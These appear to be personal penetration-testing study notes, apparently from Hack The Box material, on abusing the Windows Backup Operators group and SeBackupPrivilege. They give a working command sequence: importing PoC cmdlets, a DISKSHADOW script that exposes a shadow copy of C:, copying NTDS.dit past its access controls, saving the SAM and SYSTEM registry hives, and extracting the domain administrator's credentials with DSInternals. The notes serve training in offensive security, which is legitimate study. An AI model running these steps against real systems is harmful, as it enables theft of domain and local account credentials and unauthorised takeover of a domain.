### Backup Operators group 
members of this group assigned sebackup
Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents.
This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

 allows you to create copies of any files/directories, use it to attack domain controllers by copying NTDs.dit, or use it to dump system registery and extract NTLM hashes from them.
We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

#### Importing Libraries
```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
``` 
enable sebackup
```powershell-session
Set-SeBackupPrivilege
```
## Copying NTDS.dit

### copy entire C: Drive
```powershell-session
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
![650](Pasted%20image%2020250312170542.png)
Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.
```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
#### Backing up SAM and SYSTEM Registry Hives

 which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
 
```cmd-session
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
C:\htb> reg save HKLM\SAM SAM.SAV
```
It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.


# from windows (extract hashes)
```powershell-session
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=Blackwood,DC=local' -DBPath .\ntds.dit -BootKey $key
```
